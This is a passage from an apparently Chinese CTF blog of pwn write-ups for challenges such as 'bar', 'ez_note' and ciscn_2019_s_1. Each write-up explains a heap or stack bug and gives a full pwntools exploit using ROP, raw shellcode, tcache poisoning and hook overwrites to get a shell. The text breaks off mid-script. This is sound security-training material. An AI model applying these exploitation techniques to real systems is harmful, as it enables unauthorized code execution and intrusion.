<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;app&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29916&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1464)</span></span><br><span class="line">payload=<span class="string">&quot;\x00\x00Nameless&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s check your identity\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here you are:&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base_addr=leak_addr-<span class="number">0x4050</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x00000000000014cd</span>+base_addr</span><br><span class="line">pop_rdi=<span class="number">0x00000000000014d3</span>+base_addr</span><br><span class="line">pop_rsi_r15=base_addr+<span class="number">0x00000000000014d1</span></span><br><span class="line">leave=base_addr+<span class="number">0x00000000000012d8</span></span><br><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;And pls write your own information on it\n&quot;</span>,rop)</span><br><span class="line">p.sendafter(<span class="string">&quot;Tell me your wish:\n&quot;</span>,p64(leak_addr-<span class="number">8</span>)+p64(leave))</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x111040</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">pop_rsi=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">pop_rdx_r12=<span class="number">0x11c1e1</span>+libc_base</span><br><span class="line">pop_rax=libc_base+<span class="number">0x4a550</span></span><br><span class="line">syscall=<span class="number">0x000000000002584d</span>+libc_base</span><br><span class="line">mprotect=<span class="number">0x000000000011b970</span>+libc_base</span><br><span class="line">rop=p64(pop_rdx_r12)+p64(<span class="number">0x1000</span>)</span><br><span class="line">p.send(rop)</span><br><span class="line">pause()</span><br><span class="line">rop=p64(pop_rdi)+p64(leak_addr-<span class="number">0x50</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(base_addr+<span class="number">0x4150</span>)</span><br><span class="line">rop+=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x49\xB8\x2F\x66\x6C\x61\x67\x00\x00\x00\x41\x50\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954652.png" alt="image-20230701195452211"></p>
<h2 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h2><h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956488.png" alt="image-20221007233338793"></p>
<h3 id="漏洞所在：-2"><a href="#漏洞所在：-2" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p>首先在show函数里程序自己泄露了一个libc地址。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956489.png" alt="image-20221007233346476"></p>
<p>存在UAF漏洞：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956490.png" alt="image-20221007233356927"></p>
<p>然后在申请堆块之后写入数据时会在用户区第三个内存单元开始输入数据(第一个内存单元用于存储一个size(如下)，第二个内存单元是空的)，但是输入的数据依然是malloc申请的size，这就意味着我们可以溢出下一个内存单元的prev_size和size位</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956491.png" alt="image-20221007233404888"></p>
<p><strong>而在delete函数中我们可以控制记录堆块的那个size(如下)，但恰巧这个位置是处于free状态的堆块的fd指针(这也是这道题的核心利用点)，因此我们可以在这里篡改堆块的fd指针</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956492.png" alt="image-20221007233412071"></p>
<h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>本题我们可以控制被释放掉堆块的fd指针，同时还有libc地址，那就可以直接打tcache poisoning。</p>
<p>我们先申请四个堆块，分别为chunk1、chunk2、chunk3、chunk4（都申请size为0x50即可）</p>
<p>在chunk3中存入malloc_hook-0x10的地址</p>
<p>然后我们再将其全部释放掉，进入tcache bin。<strong>我们去修改一下chunk2的fd指针让其不指向chunk3的地址而去指向chunk3中存放的malloc_hook-0x10处，如此就劫持了tcache bin的这条链，最后申请出来在malloc_hook上写一个one_gadget的地址即可。</strong></p>
<p>调试过程如下：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956493.png" alt="image-20221007233430592"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956494.png" alt="image-20221007233448315"></p>
<p>为什么当时打tcache poisoning的时候，需要让malloc_hook的地址-0x10（原因如下），<strong>因为数据是从用户区+0x10的位置开始写入的，因此申请的时候需要提前-0x10.</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956495.png" alt="image-20221007233458822"></p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16D5</span></span><br><span class="line">d_a=<span class="number">0x16C1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">wine,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Whisky , brandy or Vodka?&quot;</span>, <span class="built_in">str</span>(wine))</span><br><span class="line">    p.sendafter(<span class="string">&quot;You may want to tell sth to the waiter:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much?&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;We will give everyone only one cup of icecream!\n&quot;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_libc_addr-libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]<span class="comment">#-0x1ed6a0+0x1000 #</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a)</span><br><span class="line">delete(<span class="number">2</span>,-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a)</span></span><br><span class="line">add(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955958.png" alt="image-20230701195513495"></p>
<h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956496.png" alt="image-20221007233524690"></p>
<h3 id="漏洞所在：-3"><a href="#漏洞所在：-3" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p>在add函数里的输入函数中，最后用atol函数对buf做了处理(如下图)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956497.png" alt="image-20221007233539574"></p>
<p>而atol函数是将字符串转换成一个长整数(long int类型)，跟这个函数很像的还有一个atoi函数，该函数是将字符串转换成一个整数(int类型)，多亏了<a href="https://survive2.github.io/">h1J4cker师傅</a>给我说了一下，以前还真没注意过这俩函数的区别。</p>
<p>而这道题的漏洞也在此，atol函数返回的是long int类型，可之后if在进行检查的时候却强转成了Int类型。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956498.png" alt="image-20221007233557237"></p>
<p>就导致了这里输入一个大数可以绕过这个检查。</p>
<p>举个例子我们输入4294967440，这个数字转换成二进制如下(int类型为4字节，最高比特位为符号位)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0001     0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure>



<p>如果是long int类型，则这个数字就是正常的。但如果是强转成Int类型，那么会舍弃4字节之外的比特位(从右往左数32比特)，这样其实在判断的时候这个数字就成了144(如下)，从而绕过了检查。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure>



<p>可是最终往堆块里输入的数据又没有进行int强转，这样我们实际写入的就是那个大数4294967440，从而导致了堆溢出。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956499.png"></p>
<h3 id="利用思路：-3"><a href="#利用思路：-3" class="headerlink" title="利用思路："></a>利用思路：</h3><p>不过本题中除了上述漏洞外不存在任何漏洞，就导致了我们想要泄露libc地址只能打一个堆块重叠让unsorted bin的fd和bk指针落在使用状态中的堆块上，然后将其打印出来。</p>
<p>具体实现过程如下:</p>
<p>1、先申请出来十个堆块，依次命名为chunk1，chunk2，chunk3…chunk10</p>
<p>2、我们将后七个堆块(chunk4-chunk10)全部释放掉</p>
<p>3、再将前三个堆块(chunk1、chunk2、chunk3)给释放掉，此时这三个堆块就会全部进入到unsorted bin中，而之后的tcache bin中的7个堆块则填满tcache bin同时还防止了前三个进入unsorted bin中的堆块与top chunk合并</p>
<p>4、再将在tcachebin中的七个堆块给申请出来，需要注意的是我们在申请第六个堆块的时候要去写入一个伪造的prev_size和size保证之后可以顺利的从unsorted bin中取出堆块。(此时的情况如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955331.png" alt="image-20230701195542851"></p>
<p>5、接下来我们申请堆块时，size写成一个大数，造成溢出来篡改unsorted bin的size。(篡改后如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955798.png" alt="image-20230701195552315"></p>
<p>6、我们申请一个特定大小的堆块让更新后的unsorted bin的fd和bk指针正好落在一个正在使用的堆块用户区。(如下图)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956109.png" alt="image-20230701195603643"></p>
<p>7、打印索引为6的堆块，就可以进行泄露libc地址</p>
<p>8、最后打一个tcache poisoing劫持tcache bin的fd指针将free_hook申请出来，释放掉一个存有&#x2F;bin&#x2F;sh字符串的堆块即可获取shell</p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16BB</span></span><br><span class="line">d_a=<span class="number">0x16A9</span></span><br><span class="line">d_s=<span class="number">0x16CD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;1.Add note\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(<span class="number">0x200</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4294967424</span>,<span class="string">b&#x27;u&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x201</span>)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x140</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ebbe0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4294967424</span>+<span class="number">16</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956096.png" alt="image-20230701195620520"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>栈迁移</tag>
        <tag>格式化字符串漏洞</tag>
        <tag>篡改got表</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF NOV X联合出题人2022年度积分榜争夺赛 pwn部分wp</title>
    <url>/posts/ffd20e6e.html</url>
    <content><![CDATA[<p>赛题WP</p>
<span id="more"></span>



<h2 id="签个到"><a href="#签个到" class="headerlink" title="签个到"></a>签个到</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011047418.png" alt="image-20221201104720121"></p>
<p>没开NX，但是对于本题来说没啥用，因为程序给了后门函数</p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011048486.png" alt="image-20221201104846427"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011052461.png" alt="image-20221201105203859"></p>
<p>最初这里有个输入的地方存在off by one漏洞，结合到下面的%s输出考虑到可能是泄露数据，发现写入的地方紧挨canary，因此这里将canary泄露出来。</p>
<p>而后程序给了两个功能，一个是申请出来一个0x20的堆块，在向堆块里输入数据的时候存在一个漏洞。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011058480.png" alt="image-20221201105840410"></p>
<p>上面的这个a2可控，将其置成0。这样判断就是v5&lt;&#x3D;-1，而v5是无符号整形因此在判断的时候-1也会转成无符号整形，也就是0xffffffff，从而导致了堆溢出。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011101525.png" alt="image-20221201110128458"></p>
<p>另一个函数是进行了三个判断，如果全部通过的话则触发后门函数。</p>
<p>正常来说的话是无论如何也不会通过检查的，因为在第三个检查的地方是在拿堆块里的数据与canary做比较，但是正常来说申请完堆块第一个内存单元是0x00000886,这样跟canary比较是不可能通过的。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>但是赋值为0x886的时候发现有个判断，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011105526.png" alt="image-20221201110531488"></p>
<p>也就是说如果申请的堆块本身在v2的位置就有数据，那么就不会对v2再进行赋值了，联想到上面提到的堆溢出，利用思路就是直接溢出top chunk,不改变其size，但是在其用户区提前布置好canary，这样下次申请的新堆块在v2的位置本身就有数据了，从而通过最后的检查。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn_5&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25028&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">9</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;power length: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;data: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0xc</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x20d51</span>)+p64(canary)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,p64(canary)[<span class="number">4</span>:])</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x17E3</span>,<span class="number">0x181E</span>,<span class="number">0x182A</span>,<span class="number">0x168F</span>)  </span><br><span class="line">cmp(p64(canary)[<span class="number">4</span>:])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011110205.png" alt="image-20221201111058054"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>整形溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_s_1</title>
    <url>/posts/f5fe6d2b.html</url>
    <content><![CDATA[<p>考察了off by null</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012000568.png"></p>
<h2 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012000569.png"></p>
<p>在edit函数中存在一个off by null漏洞。</p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012000570.png"></p>
<p>在add函数中，对malloc申请的内存大小做了限制，需要小于0x100并且大于0x7f的堆块才行，然后索引我们可以使用0到31(32没法用，因为这里的len[32]和heap[0]是一个内存单元，如果用了32，那么len[32]就有数据了，到了申请索引为0号堆块的时候，heap[0]有内容，就会进入if程序退出)</p>
<p>edit函数中存在一个off by null，并且有个key1的限制，导致了edit函数只能执行两次。</p>
<p>show函数表面感觉能使用，但是key2在bss段，默认值为0，所以show函数我们无法正常使用(如下图)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012000571.png"></p>
<p>delete函数可以无限次使用，但是不存在漏洞。</p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>程序的libc版本为2.29,我们常规打一个off by null做一个堆块重叠，但是由于我们无法直接释放掉堆块让其进入unsorted bin(而off by null做的堆块合并需要让堆块位于unsorted bin中)，所以在这之前我们需要tcachebin中填满堆块(不必担心索引的问题，我们有32个索引可以用，同时delete函数还可以清空索引中内容)</p>
<p>然后打一个off by null，此时的堆块布局应该如下：</p>
<p>这个merge chunk的prev size被修改为了0x200  (merged chunk之所以可以进入unsorted bin中是因为在这之前tcahce bin中已经装了七个chunk了)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012000572.png"></p>
<p>然后我们释放掉merge chunk，触发合并，打一个堆块重叠，然后做一个double free出来。接着打tcache poisoning,我们去将堆块的fd指针去修改为0x6021d0这个地址，因为这个地址既属于我们的heap指针数组，同时加上0xf0后还可以去修改key1和key2。</p>
<p>(其实这道题看见key这个名字同时联想下key1和key2的作用，很容易想到去篡改这两个值，不然edit用不了，我们之后的各种手法都会失效，而修改key2还可以使用show函数)，但如果仅仅是修改key值的话，就导致了我们之后还要再打一遍off by null，但是0xf0这个链已经成-1坏掉了，应该就没法利用了(我没有仔细考虑这种方法，但是我试了下，这0xf0链坏掉之后，off by null就没法再打一次了，如果最开始做三个相同的堆块地址，保证0xf0的这个链不会在第一次打个double free就坏掉，应该也可以利用(但是我没有试，这只是我的一个思路))</p>
<p>但是我当时看了下bss段存储的数据，发现可以同时控制key1、key2和heap指针数组里的内容，就是申请到0x6021d0这个地址，这个地址位于heap[31]，我们先申请出来修改key1和key2的值，然后执行show函数拿到libc地址，再去往0x6021d0这个地址上写入free_hook的地址，最后编辑heap[31]这个块，写入system的地址即可。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400DEE</span></span><br><span class="line">d_a=<span class="number">0x400DE2</span></span><br><span class="line">d_e=<span class="number">0x400DFA</span></span><br><span class="line">d_s=<span class="number">0x400E06</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27970&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span 